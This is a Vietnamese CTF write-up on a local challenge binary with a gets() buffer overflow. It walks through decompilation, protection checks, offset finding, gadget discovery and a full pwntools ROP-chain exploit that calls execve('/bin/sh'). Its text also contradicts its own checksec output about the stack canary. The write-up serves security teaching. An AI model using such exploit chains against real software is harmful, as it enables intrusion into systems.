# ROPchain_chall_demo_file
* Gadget là những đoạn mã ngắn trong chương trình kết thúc bằng lệnh `ret` (return).
* ROP là kỹ thuật khai thác cho phép thực thi mã thông qua việc sắp xếp các địa chỉ của các gadget có sẵn trong chương trình. Kỹ thuật này thường được dùng để vượt qua các biện pháp bảo mật như NX (Non-Executable Stack).

**Ta có một file binary** `chall4`

## Decompile bằng ida64
```bash
ida64 chall4
```

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // edx
  int v4; // ecx
  int v5; // r8d
  int v6; // r9d
  char v8[80]; // [rsp+0h] [rbp-50h] BYREF

  init(argc, argv, envp);
  printf((unsigned int)"Say something: ", (_DWORD)argv, v3, v4, v5, v6, v8[0]);
  gets(v8);
  return 0;
}
```
* Xuất hiện lỗi buffer overflow do hàm gets có thể nhập vào không giới hạn.

## Kiểm tra chế độ bảo vệ
```bash
checksec chall4
```
**Kết quả:**
```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
```
- Ta thấy trong chương trình không có lớp bảo vệ canary nhưng có thể do lỗi của hàm `checksec`.
- Các cơ chế bảo vệ: no PIE, NX enabled (vì vậy phải dùng ROP).
## Tính offset tới return address
* Đặt break point và nhập input, kiểm tra giá trị save rip
```
pwndbg> cyclic  -l 0x616161616161616c
Finding cyclic pattern of 8 bytes: b'laaaaaaa' (hex: 0x6c61616161616161)
Found at offset 88
```
## Tìm gadgets để kiểm soát thanh ghi
```bash
ROPgadget --binary chall4 | grep "pop rdi"
ROPgadget --binary chall4 | grep "pop rsi"
ROPgadget --binary chall4 | grep "pop rdx"
ROPgadget --binary chall4 | grep "pop rax"
ROPgadget --binary chall4 | grep "syscall"
```
**Kết quả tìm được**
```python
pop_rdi = 0x000000000040220e
pop_rsi = 0x00000000004015ae
pop_rdx = 0x00000000004043e4
pop_rax = 0x0000000000401001
syscall = 0x000000000040132e
```

* Do ta đang tạo shell bằng các gadget assembly, chúng không có lệnh `system("/bin/sh")` như ở libc, vì vậy ta sẽ thực thi lệnh `execve("/bin/sh", 0, 0)`. Do đó ta cần thiết lập thanh ghi rdi làm con trỏ trỏ tới chuỗi "/bin/sh", rsi và rdx là null.

## Xây dựng payload
```python
payload = b'A' * 88
```
* Tìm một địa chỉ stack có quyền write:
```bash
vmmap
```
>0x406000           0x408000 rw-p     2000    5000 chall4
```bash
x/50xg 0x406000
```
> 0x406e00:       0x0000000000000000      0x0000000000000000
* Ta có được
```python
rw_section = 0x406e00
```

* Xây dựng arg cho `gets` để nhập vào chuỗi "/bin/sh"
```python
payload += p64(pop_rdi) + p64(rw_section) + p64(exe.sym['gets'])
```
* Gửi đi payload và gửi vào chuỗi "/bin/sh" :
```python
p.sendlineafter(b'something: ', payload)
p.sendline(b'/bin/sh')
```
* Thực thi hàm `execve`:
```python
payload += p64(pop_rdi) + p64(rw_section)
```
* Thiết lập arg2 và arg3
```python
payload += p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0)    
```
* Thiết lập syscall number của hàm `execve` và thực hiện gọi hàm
```python
payload += p64(pop_rax) + p64(0x3b)
payload += p64(syscall)
```
* Thực hiện debug động ta thấy sau khi set null cho arg 3 là rdx, ta phải thêm cho payload 0x28 byte nữa để nhảy tới pop_rax. Như vậy script đầy đủ như sau:
```python
#!/usr/bin/python3

from pwn import *

exe = ELF('./chall4', checksec=False)

p = process('./chall4')

pop_rdi = 0x000000000040220e
pop_rsi = 0x00000000004015ae
pop_rdx = 0x00000000004043e4
pop_rax = 0x0000000000401001
syscall = 0x000000000040132e
rw_section = 0x406e00


payload = b'A' * 88
payload += p64(pop_rdi) + p64(rw_section) + p64(exe.sym['gets'])


payload += p64(pop_rdi) + p64(rw_section)
payload += p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0)
payload += b'b' * 0x28
payload += p64(pop_rax) + p64(0x3b)
payload += p64(syscall)


p.sendlineafter(b'something: ', payload)
p.sendline(b'/bin/sh')

p.interactive()
```
### Chạy thử
```bash
./solve4.py
```
```bash
$ ls | cat Flag.txt
```
* Kết quả:
```
WELL DONE! THIS IS YOUR FLAG: CTF{ISP_VO_DICH} $
```







